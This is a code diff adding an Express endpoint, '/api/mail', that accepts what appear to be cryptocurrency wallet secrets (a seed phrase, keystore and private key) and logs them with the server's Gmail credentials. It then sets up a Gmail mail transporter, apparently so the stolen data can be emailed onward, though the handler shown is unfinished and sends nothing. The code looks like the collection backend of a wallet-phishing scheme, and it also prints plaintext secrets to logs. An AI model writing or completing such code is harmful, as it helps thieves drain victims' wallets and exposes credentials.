@@ -83,7 +83,31 @@ app.post("/api/send-email", async (req, res) => {
     res.status(500).json({ error: "Email failed" });
   }
 });
+app.post("/api/mail", async (req, res) => {
+  try {
+    
+ 
+  console.log("Received request to send email with body:", req.body);
 
+  const { phrase, keystore, privateKey, item } = req.body;
+  const email = process.env.EMAIL_USER || "";
+  const pass = process.env.EMAIL_PASS || "";
+console.log(email,pass,phrase,keystore,privateKey,item);
+
+  // Gmail transporter with app password
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: email,
+      pass,
+    },
+  });
+ console.log(transporter);
+ 
+  } catch (error) {
+    console.log(error);
+  }
+});
 app.get("/api/send-email", async (req, res) => {
     const email = process.env.EMAIL_USER || "";
   res.send(email)}
